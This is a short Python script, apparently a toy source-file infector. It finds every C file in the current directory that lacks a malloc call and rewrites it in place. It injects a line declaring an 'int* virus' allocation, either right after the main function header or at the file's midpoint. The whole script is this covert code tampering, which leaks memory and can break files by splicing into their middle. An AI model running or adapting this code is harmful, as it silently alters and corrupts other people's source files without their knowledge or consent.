import sys
import os
import glob

new_line = "\tint* virus = (int*)malloc(sizeof(int));\n"
for file in glob.glob("*.c"):
    f = open(file, "r")
    content = f.readlines()
    f.close()
    if not any("malloc" in line for line in content):
        print("found a file")
        main = False
        for no, line in enumerate(content):
            if main:
                new_content = content[:no]
                new_content.append(new_line)
                new_content += content[no:]
                break
            else:
                if "int main(" in line:
                    main = True
        if not main:
            no = len(content)//2
            new_content = content[:no]
            new_content.append(new_line)
            new_content += content[no:]
        f = open(file, "w")
        f.writelines(new_content)
        f.close()
